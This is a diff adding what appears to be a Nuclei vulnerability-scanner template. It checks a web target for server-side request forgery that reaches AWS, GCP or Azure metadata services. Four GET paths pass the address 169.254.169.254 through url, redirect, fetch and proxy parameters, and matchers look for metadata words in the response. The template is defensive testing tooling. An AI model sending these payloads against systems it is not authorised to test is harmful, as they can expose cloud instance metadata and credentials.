@@ -1,0 +1,27 @@
+id: whai-ssrf-cloud-metadata
+
+info:
+  name: SSRF to Cloud Metadata Services
+  author: whitehat-ai
+  severity: critical
+  description: Tests for SSRF reaching cloud metadata (AWS, GCP, Azure)
+  tags: ssrf,cloud,metadata,critical
+  classification:
+    cwe-id: CWE-918
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?redirect=http://169.254.169.254/"
+      - "{{BaseURL}}/?fetch=http://169.254.169.254/"
+      - "{{BaseURL}}/?proxy=http://169.254.169.254/"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "computeMetadata"
+        condition: or
